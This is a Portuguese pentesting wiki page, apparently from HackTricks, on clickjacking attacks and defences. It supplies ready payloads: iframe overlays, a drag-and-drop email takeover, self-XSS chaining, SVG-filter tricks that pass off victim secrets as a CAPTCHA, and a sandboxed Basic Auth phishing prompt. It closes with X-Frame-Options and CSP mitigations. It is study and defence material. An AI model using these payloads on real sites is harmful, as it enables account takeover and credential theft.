# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## O que é Clickjacking

Em um ataque de clickjacking, um **usuário** é **enganado** para **clicar** em um **elemento** em uma página web que está **invisível** ou disfarçado como um elemento diferente. Essa manipulação pode levar a consequências indesejadas para o usuário, como o download de malware, redirecionamento para páginas web maliciosas, fornecimento de credentials ou informações sensíveis, transferências de dinheiro ou a compra online de produtos.

### Truque de pré-preenchimento de formulários

Às vezes é possível **preencher o valor dos campos de um formulário usando parâmetros GET ao carregar a página**. Um atacante pode abusar desse comportamento para preencher um formulário com dados arbitrários e enviar o payload de clickjacking para que o usuário pressione o botão Submit.

### Preencher formulário com Drag\&Drop

Se você precisa que o usuário **preencha um formulário** mas não quer pedir diretamente que ele escreva alguma informação específica (como o email e/ou uma senha específica que você conhece), você pode simplesmente pedir que ele **Drag\&Drop** algo que irá inserir os dados que você controla, como em [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Payload básico
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Payload em Múltiplas Etapas
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Se você identificou um **XSS que requer que um usuário clique** em algum elemento para **disparar** o XSS e a página é **vulnerável a clickjacking**, você poderia abusar disso para enganar o usuário e fazê‑lo clicar no botão/link.\
Exemplo:\
Você encontrou um **self XSS** em alguns detalhes privados da conta (detalhes que **apenas você pode configurar e ler**). A página com o **formulário** para configurar esses detalhes é **vulnerável** a **Clickjacking** e você pode **prepopular** o **formulário** com os parâmetros GET.\
Um atacante poderia preparar um ataque de **Clickjacking** nessa página **prepopulando** o **formulário** com o **XSS payload** e **enganando** o **usuário** para **enviar** o formulário. Assim, **quando o formulário for enviado** e os valores forem modificados, o **usuário executará o XSS**.


### DoubleClickjacking

Primeiramente [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), essa técnica pede que a vítima dê um duplo clique em um botão de uma página customizada posicionada em um local específico, e usa as diferenças de timing entre os eventos mousedown e onclick para carregar a página da vítima durante o duplo clique, de modo que a **vítima realmente clique em um botão legítimo na página da vítima**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Esta técnica permite enganar o usuário para clicar em um único local na página da vítima, contornando todas as proteções contra clickjacking. Portanto, o atacante precisa encontrar **ações sensíveis que possam ser realizadas com apenas 1 clique, como prompts OAuth que aceitam permissões**.

### SVG Filters / Cross-Origin Iframe UI Redressing

Versões modernas do Chromium/WebKit/Gecko permitem que o CSS `filter:url(#id)` seja aplicado a cross-origin iframes. Os pixels rasterizados do iframe são expostos ao grafo de filtros SVG como `SourceGraphic`, então primitivas como `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, etc. podem deformar arbitrariamente a UI da vítima antes que o usuário a veja, mesmo que o atacante nunca toque no DOM. Um filtro simples no estilo Liquid-Glass se parece com:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Primitivas úteis: `feImage` carrega bitmaps do atacante (por ex., overlays, displacement maps); `feFlood` cria mattes de cor constante; `feOffset/feGaussianBlur` refina realces; `feDisplacementMap` refrata/distorce texto; `feComposite operator="arithmetic"` implementa matemática arbitrária por canal (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), o que é suficiente para reforço de contraste, mascaramento e operações AND/OR; `feTile` recorta e replica sondas de pixel; `feMorphology` expande/contrai traços; `feColorMatrix` move luma para alpha para construir máscaras precisas.

#### Distorcendo segredos em prompts estilo CAPTCHA

Se um endpoint emoldurável renderiza segredos (tokens, reset codes, API keys), o atacante pode distorcê-los para que se pareçam com um CAPTCHA e forçar a transcrição manual:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
Os pixels distorcidos enganam o usuário para “resolver” o captcha dentro do `<input>` controlado pelo atacante cujo `pattern` impõe o segredo real da vítima.

#### Recontextualizando entradas da vítima

Filtros podem remover cirurgicamente o texto de placeholder/validação mantendo as teclas digitadas pelo usuário. Um fluxo de trabalho:

1. `feComposite operator="arithmetic" k2≈4` amplifica o brilho para que o texto auxiliar cinza sature para branco.
2. `feTile` limita a área de trabalho ao retângulo do input.
3. `feMorphology operator="erode"` engrossa os glifos escuros digitados pela vítima e os armazena via `result="thick"`.
4. `feFlood` cria uma placa branca, `feBlend mode="difference"` com `thick`, e um segundo `feComposite k2≈100` converte isso em um luma matte nítido.
5. `feColorMatrix` move essa luma para o alpha, e `feComposite in="SourceGraphic" operator="in"` mantém apenas os glifos inseridos pelo usuário.
6. Outro `feBlend in2="white"` mais um corte fino produz uma caixa de texto limpa, após o que o atacante sobrepõe seus próprios rótulos HTML (por exemplo, “Insira seu e-mail”) enquanto o iframe oculto ainda aplica a política de senha da origem da vítima.

Safari tem problemas com `feTile`; o mesmo efeito pode ser reproduzido com máscaras espaciais construídas a partir de `feFlood` + `feColorMatrix` + `feComposite` para payloads só para WebKit.

#### Sondas de pixels, lógica e máquinas de estado

Ao recortar uma região de 2–4 px com `feTile` e repeti-la (tiling) para `100%` do viewport, o atacante transforma a cor amostrada em uma textura de quadro completo que pode ser limiarizada em uma máscara booleana:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
Para cores arbitrárias, uma referência `feFlood` (por exemplo, `#0B57D0`) mais `feBlend mode="difference"` e outro composite aritmético (`k2≈100`, `k4` como tolerância) gera branco apenas quando o pixel amostrado corresponde ao tom alvo. Alimentar essas máscaras em `feComposite` com `k1..k4` ajustados produz portas lógicas: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via blending contra branco. Encadear portas cria um somador completo dentro do grafo de filtros, provando que o pipeline é funcionalmente completo.

Portanto, atacantes podem ler o estado da UI sem JavaScript. Exemplos de booleanos de um fluxo de modal:

- **D** (dialog visible): verifique um canto escurecido e compare contra branco.
- **L** (dialog loaded): verifique as coordenadas onde o botão aparece quando estiver pronto.
- **C** (checkbox checked): compare o pixel da checkbox contra o azul ativo `#0B57D0`.
- **R** (red success/failure banner): use `feMorphology` e limiares vermelhos dentro do retângulo do banner.

Cada estado detectado ativa um bitmap de sobreposição diferente embutido via `feImage xlink:href="data:..."`. Mascarar esses bitmaps com `D`, `L`, `C`, `R` mantém as sobreposições sincronizadas com o diálogo real e conduz a vítima por fluxos multi-etapa (redefinições de senha, aprovações, confirmações destrutivas) sem expor o DOM.

### Diálogo Basic Auth em iframe sandbox (sem allow-popups)

Um iframe em sandbox sem `allow-popups` ainda pode exibir um **HTTP Basic Authentication modal** quando um carregamento retorna `401` com `WWW-Authenticate`. O diálogo é gerado pela camada de rede/autenticação do navegador (não por JS `alert/prompt/confirm`), portanto restrições de popups no sandbox **não** o suprimem. Se você puder controlar o iframe com script (por exemplo, `sandbox="allow-scripts"`) pode navegá-lo para qualquer endpoint que emita um desafio de Basic Auth:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Uma vez que a resposta chega, o navegador solicita credenciais mesmo que popups estejam bloqueados. Enquadrar uma origem confiável com esse truque permite UI redress/phishing: prompts modais inesperados dentro de um widget "sandboxed" podem confundir usuários ou acionar password managers para oferecer credenciais armazenadas.

### Browser extensions: DOM-based autofill clickjacking

Além de iframing páginas da vítima, atacantes podem mirar em elementos de UI de extensões do navegador que são injetados na página. Password managers renderizam dropdowns de autofill próximos aos inputs focados; ao focar um campo controlado pelo atacante e esconder/ocluir o dropdown da extensão (truques de opacity/overlay/top-layer), um clique coagido do usuário pode selecionar um item armazenado e preencher dados sensíveis em inputs controlados pelo atacante. Essa variante não requer exposição via iframe e funciona inteiramente por manipulação do DOM/CSS.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Scripts executados no lado do cliente podem realizar ações para prevenir Clickjacking:

- Garantir que a janela da aplicação seja a janela principal (top window).
- Tornar todos os frames visíveis.
- Impedir cliques em frames invisíveis.
- Detectar e alertar usuários sobre possíveis tentativas de Clickjacking.

No entanto, esses scripts de frame-busting podem ser contornados:

- **Configurações de Segurança dos Navegadores:** Alguns navegadores podem bloquear esses scripts com base em suas configurações de segurança ou pela falta de suporte a JavaScript.
- **HTML5 iframe `sandbox` Attribute:** Um atacante pode neutralizar scripts de frame-busting definindo o atributo `sandbox` com os valores `allow-forms` ou `allow-scripts` sem `allow-top-navigation`. Isso impede que o iframe verifique se é a janela superior, por exemplo,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Os valores `allow-forms` e `allow-scripts` permitem ações dentro do iframe enquanto desativam a navegação no nível superior. Para garantir a funcionalidade pretendida do site alvo, permissões adicionais como `allow-same-origin` e `allow-modals` podem ser necessárias, dependendo do tipo de ataque. Mensagens do console do navegador podem indicar quais permissões permitir.

### Defesas no Lado do Servidor

#### X-Frame-Options

O **cabeçalho de resposta HTTP `X-Frame-Options`** informa aos navegadores sobre a legitimidade de renderizar uma página em um `<frame>` ou `<iframe>`, ajudando a prevenir Clickjacking:

- `X-Frame-Options: deny` - Nenhum domínio pode incorporar o conteúdo em um frame.
- `X-Frame-Options: sameorigin` - Apenas o site atual pode incorporar o conteúdo em um frame.
- `X-Frame-Options: allow-from https://trusted.com` - Apenas o 'uri' especificado pode incorporar a página.
- Observe as limitações: se o navegador não suportar essa diretiva, ela pode não funcionar. Alguns navegadores preferem a diretiva frame-ancestors do CSP.

#### Content Security Policy (CSP) frame-ancestors directive

A **diretiva `frame-ancestors` no CSP** é o método recomendado para proteção contra Clickjacking:

- `frame-ancestors 'none'` - Semelhante a `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Semelhante a `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Semelhante a `X-Frame-Options: allow-from`.

Por exemplo, o seguinte CSP permite que a página seja incorporada apenas pelo mesmo domínio:

`Content-Security-Policy: frame-ancestors 'self';`

Mais detalhes e exemplos complexos podem ser encontrados na [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) e na [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) com `child-src` e `frame-src`

**Content Security Policy (CSP)** é uma medida de segurança que ajuda a prevenir Clickjacking e outros ataques de injeção de código ao especificar quais fontes o navegador deve permitir carregar conteúdo.

#### `frame-src` Directive

- Define fontes válidas para frames.
- Mais específica que a diretiva `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Esta política permite frames da mesma origem (self) e https://trusted-website.com.

#### `child-src` Diretiva

- Introduzida no CSP nível 2 para definir fontes válidas para web workers e frames.
- Atua como fallback para frame-src e worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Esta política permite frames e workers da mesma origem (self) e https://trusted-website.com.

**Notas de Uso:**

- Deprecação: child-src está sendo descontinuado em favor de frame-src e worker-src.
- Comportamento de fallback: se frame-src estiver ausente, child-src é usado como fallback para frames. Se ambos estiverem ausentes, default-src é usado.
- Definição estrita de fontes: inclua apenas fontes confiáveis nas diretivas para prevenir exploração.

#### Scripts JavaScript frame-busting

Embora não sejam completamente à prova, scripts JavaScript baseados em frame-busting podem ser usados para impedir que uma página web seja embebida em um frame. Exemplo:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Utilizando Anti-CSRF Tokens

- **Validação de Token:** Use anti-CSRF tokens em aplicações web para garantir que requisições que alteram estado sejam feitas intencionalmente pelo usuário e não através de uma página Clickjacked.

## Referências

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
